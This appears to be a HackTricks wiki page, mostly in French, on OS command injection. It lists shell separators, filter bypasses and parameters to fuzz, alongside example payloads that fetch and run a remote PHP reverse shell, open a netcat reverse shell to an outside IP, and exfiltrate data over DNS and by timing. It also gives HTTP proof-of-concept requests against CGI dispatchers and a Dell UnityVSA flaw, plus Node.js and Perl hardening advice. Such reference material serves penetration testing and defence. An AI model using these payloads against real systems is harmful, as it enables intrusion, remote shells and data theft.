# Command Injection

{{#include ../banners/hacktricks-training.md}}

## Qu'est-ce que command Injection ?

Une **command injection** permet l'exécution de commandes arbitraires du système d'exploitation par un attaquant sur le serveur hébergeant une application. En conséquence, l'application et toutes ses données peuvent être entièrement compromises. L'exécution de ces commandes permet généralement à l'attaquant d'obtenir un accès non autorisé ou de prendre le contrôle de l'environnement de l'application et du système sous-jacent.

### Contexte

Selon **l'endroit où votre input est injecté** vous devrez peut-être **terminer le contexte entre guillemets** (en utilisant `"` ou `'`) avant les commandes.

## Command Injection/Execution
```bash
#Both Unix and Windows supported
ls||id; ls ||id; ls|| id; ls || id # Execute both
ls|id; ls |id; ls| id; ls | id # Execute both (using a pipe)
ls&&id; ls &&id; ls&& id; ls && id #  Execute 2º if 1º finish ok
ls&id; ls &id; ls& id; ls & id # Execute both but you can only see the output of the 2º
ls %0A id # %0A Execute both (RECOMMENDED)
ls%0abash%09-c%09"id"%0a   # (Combining new lines and tabs)

#Only unix supported
`ls` # ``
$(ls) # $()
ls; id # ; Chain commands
ls${LS_COLORS:10:1}${IFS}id # Might be useful

#Not executed but may be interesting
> /var/www/html/out.txt #Try to redirect the output to a file
< /etc/passwd #Try to send some input to the command
```
### **Limitation** Bypasses

Si vous essayez d'exécuter **des commandes arbitraires sur une machine linux** vous serez intéressé à lire ces **Bypasses:**

{{#ref}}
../linux-hardening/bypass-bash-restrictions/
{{#endref}}

### **Exemples**
```
vuln=127.0.0.1 %0a wget https://web.es/reverse.txt -O /tmp/reverse.php %0a php /tmp/reverse.php
vuln=127.0.0.1%0anohup nc -e /bin/bash 51.15.192.49 80
vuln=echo PAYLOAD > /tmp/pay.txt; cat /tmp/pay.txt | base64 -d > /tmp/pay; chmod 744 /tmp/pay; /tmp/pay
```
### Paramètres

Voici les 25 paramètres principaux qui pourraient être vulnérables à code injection et à des vulnérabilités RCE similaires (d'après [link](https://twitter.com/trbughunters/status/1283133356922884096)) :
```
?cmd={payload}
?exec={payload}
?command={payload}
?execute{payload}
?ping={payload}
?query={payload}
?jump={payload}
?code={payload}
?reg={payload}
?do={payload}
?func={payload}
?arg={payload}
?option={payload}
?load={payload}
?process={payload}
?step={payload}
?read={payload}
?function={payload}
?req={payload}
?feature={payload}
?exe={payload}
?module={payload}
?payload={payload}
?run={payload}
?print={payload}
```
### Exfiltration de données basée sur le temps

Extraction des données : caractère par caractère
```
swissky@crashlab▸ ~ ▸ $ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
real    0m5.007s
user    0m0.000s
sys 0m0.000s

swissky@crashlab▸ ~ ▸ $ time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi
real    0m0.002s
user    0m0.000s
sys 0m0.000s
```
### DNS based data exfiltration

Basé sur l'outil de `https://github.com/HoLyVieR/dnsbin` également hébergé sur dnsbin.zhack.ca
```
1. Go to http://dnsbin.zhack.ca/
2. Execute a simple 'ls'
for i in $(ls /) ; do host "$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done
```

```
$(host $(wget -h|head -n1|sed 's/[ ,]/-/g'|tr -d '.').sudo.co.il)
```
Outils en ligne pour vérifier l'exfiltration de données via DNS :

- dnsbin.zhack.ca
- pingb.in

### Contournement du filtrage

#### Windows
```
powershell C:**2\n??e*d.*? # notepad
@^p^o^w^e^r^shell c:**32\c*?c.e?e # calc
```
#### Linux


{{#ref}}
../linux-hardening/bypass-bash-restrictions/
{{#endref}}

### Node.js `child_process.exec` vs `execFile`

Lorsque vous auditez des back-ends JavaScript/TypeScript, vous rencontrerez souvent l'API Node.js `child_process`.
```javascript
// Vulnerable: user-controlled variables interpolated inside a template string
const { exec } = require('child_process');
exec(`/usr/bin/do-something --id_user ${id_user} --payload '${JSON.stringify(payload)}'`, (err, stdout) => {
/* … */
});
```
`exec()` lance un **shell** (`/bin/sh -c`), donc tout caractère ayant une signification spéciale pour le shell (back-ticks, `;`, `&&`, `|`, `$()`, …) entraînera une **command injection** lorsque la saisie utilisateur est concaténée dans la chaîne.

**Atténuation :** utilisez `execFile()` (ou `spawn()` sans l'option `shell`) et fournissez **chaque argument comme un élément séparé du tableau** afin qu'aucun shell ne soit impliqué :
```javascript
const { execFile } = require('child_process');
execFile('/usr/bin/do-something', [
'--id_user', id_user,
'--payload', JSON.stringify(payload)
]);
```
Real-world case: *Synology Photos* ≤ 1.7.0-0794 was exploitable through an unauthenticated WebSocket event that placed attacker controlled data into `id_user` which was later embedded in an `exec()` call, achieving RCE (Pwn2Own Ireland 2024).

### Argument/Option injection via leading hyphen (argv, no shell metacharacters)

Toutes les injections n'exigent pas de métacaractères shell. Si l'application passe des chaînes non fiables comme arguments à un utilitaire système (même avec `execve`/`execFile` et sans shell), beaucoup de programmes analyseront quand même tout argument commençant par `-` ou `--` comme une option. Cela permet à un attaquant de changer de mode, modifier des chemins de sortie ou déclencher des comportements dangereux sans jamais passer par un shell.

Typical places where this appears:

- Embedded web UIs/CGI handlers that build commands like `ping <user>`, `tcpdump -i <iface> -w <file>`, `curl <url>`, etc.
- Centralized CGI routers (e.g., `/cgi-bin/<something>.cgi` with a selector parameter like `topicurl=<handler>`) where multiple handlers reuse the same weak validator.

What to try:

- Provide values that start with `-`/`--` to be consumed as flags by the downstream tool.
- Abuse flags that change behavior or write files, for example:
- `ping`: `-f`/`-c 100000` to stress the device (DoS)
- `curl`: `-o /tmp/x` to write arbitrary paths, `-K <url>` to load attacker-controlled config
- `tcpdump`: `-G 1 -W 1 -z /path/script.sh` to achieve post-rotate execution in unsafe wrappers
- If the program supports `--` end-of-options, try to bypass naive mitigations that prepend `--` in the wrong place.

Generic PoC shapes against centralized CGI dispatchers:
```
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Content-Type: application/x-www-form-urlencoded

# Flip options in a downstream tool via argv injection
topicurl=<handler>&param=-n

# Unauthenticated RCE when a handler concatenates into a shell
topicurl=setEasyMeshAgentCfg&agentName=;id;
```
## Liste de détection Brute-Force


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/command_injection.txt
{{#endref}}

## Perl backticks/qx// sinks dans Apache mod_perl handlers (reachability and exploitation)

Pattern réel : Le code Perl construit une chaîne de commande shell et l'exécute via backticks (ou qx//). Dans un mod_perl AccessHandler, des composants de requête contrôlés par un attaquant comme $r->uri() peuvent se retrouver dans cette chaîne. Si une branche concatène de l'entrée brute puis l'évalue avec un shell, vous obtenez un pre-auth RCE.

Primitives d'exécution Perl risquées (spawn a shell when given a single string) :
- Backticks / qx//: my $out = `cmd ...`;
- system avec une seule chaîne : system("/bin/sh -c '...'") implicitement
- open avec un pipe : open my $fh, "cmd |" or "| cmd"
- IPC::Open3 avec une seule chaîne

Forme minimale vulnérable observée dans la nature :
```perl
sub getCASURL {
...
my $exec_cmd = "...";
if ($type eq 'login') {
$exec_cmd .= $uri;        # $uri from $r->uri() → attacker-controlled
my $out = `$exec_cmd`;    # backticks = shell
}
}
```
Considérations clés d'atteignabilité dans mod_perl:
- Handler registration : httpd.conf doit router les requêtes vers votre module Perl, p.ex. PerlModule MOD_SEC_EMC::AccessHandler et une configuration qui invoque AccessHandler::handler pour une portée de chemin.
- Déclenchement de la branche vulnérable : forcer le flux de connexion non authentifié de sorte que type == "login" (p.ex., omettre le cookie d'auth attendu).
- Chemin résolvable : assurez-vous que votre requête cible une URI qui se résout dans la portée configurée. Si Apache ne route jamais la requête via le handler, le sink n'est pas atteint.

Exploitation workflow
1) Inspectez httpd.conf pour les scopes PerlModule/MOD_PERL handler afin de trouver un chemin résolvable traité par le handler.
2) Envoyez une requête non authentifiée pour que le chemin de redirection de login soit pris (type == "login").
3) Placez des métacaractères shell dans le chemin request-URI afin que $r->uri() transporte votre payload dans la chaîne de commande.

Exemple HTTP PoC (path injection via ';')
```http
GET /ui/health;id HTTP/1.1
Host: target
Connection: close
```
Conseils
- Essayez des séparateurs : ;, &&, |, `backticks`, $(...), et des retours à la ligne encodés (%0A) selon le quoting.
- Si des patchs antérieurs mettent entre guillemets d'autres args mais pas l'URI dans une branche, des payloads ajoutés à la fin de la chaîne fonctionnent souvent : ;id# ou &&/usr/bin/id#

Durcissement (Perl)
- Ne construisez pas de chaînes shell. Préférez l'exécution en vecteur d'arguments : system('/usr/bin/curl', '--silent', '--', $safe_url) — pas de shell.
- Si un shell est inévitable, échappez strictement et de manière cohérente dans toutes les branches ; considérez $r->uri() comme hostile. Envisagez URI::Escape pour les paths/queries et des allowlists strictes.
- Évitez backticks/qx// pour l'exécution de commandes ; capturez la sortie via open3/list form si vraiment nécessaire sans invoquer un shell.
- Dans les handlers mod_perl, gardez les chemins auth/redirect sans exécution de commandes ou assurez une sanitation identique entre les branches pour éviter des régressions « fixed everywhere but one branch ».

Recherche de vulnérabilités
- Différenciez les modules qui assemblent des commandes shell ; recherchez des guillemets incohérents entre les branches (par ex., if ($type eq 'login') laissé non échappé).
- Grepez pour backticks, qx//, open\s*\(|\||, et system\s*\(\s* pour trouver des shells basés sur des chaînes. Construisez un graphe d'appels du sink jusqu'à l'entrée de la requête ($r) pour vérifier la reachabilité pré-auth.

Cas réel : Dell UnityVSA pre-auth RCE (CVE-2025-36604)
- Injection de commande pre-auth via backticks dans AccessTool.pm:getCASURL lorsque type == "login" concatène le $uri brut ($r->uri()).
- Accessible via MOD_SEC_EMC::AccessHandler → make_return_address($r) → getCASLoginURL(..., type="login") → getCASURL(..., $uri, 'login').
- Nuance pratique : utilisez un path résolvable couvert par le handler ; sinon le module ne s'exécutera pas et le sink ne sera pas atteint.

## Références

- [It’s Never Simple Until It Is: Dell UnityVSA Pre‑Auth Command Injection (CVE‑2025‑36604)](https://labs.watchtowr.com/its-never-simple-until-it-is-dell-unityvsa-pre-auth-command-injection-cve-2025-36604/)
- [Dell PSIRT DSA‑2025‑281 – Security update for Dell Unity/UnityVSA/Unity XT](https://www.dell.com/support/kbdoc/en-uk/000350756/dsa-2025-281-security-update-for-dell-unity-dell-unityvsa-and-dell-unity-xt-security-update-for-multiple-vulnerabilities)
- [watchTowr Detection Artefact Generator – Dell UnityVSA Pre‑Auth CVE‑2025‑36604](https://github.com/watchtowrlabs/watchTowr-vs-Dell-UnityVSA-PreAuth-CVE-2025-36604)

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [https://portswigger.net/web-security/os-command-injection](https://portswigger.net/web-security/os-command-injection)
- [Extraction of Synology encrypted archives – Synacktiv 2025](https://www.synacktiv.com/publications/extraction-des-archives-chiffrees-synology-pwn2own-irlande-2024.html)
- [PHP proc_open manual](https://www.php.net/manual/en/function.proc-open.php)
- [HTB Nocturnal: IDOR → Command Injection → Root via ISPConfig (CVE‑2023‑46818)](https://0xdf.gitlab.io/2025/08/16/htb-nocturnal.html)
- [Unit 42 – TOTOLINK X6000R: Three New Vulnerabilities Uncovered](https://unit42.paloaltonetworks.com/totolink-x6000r-vulnerabilities/)

{{#include ../banners/hacktricks-training.md}}
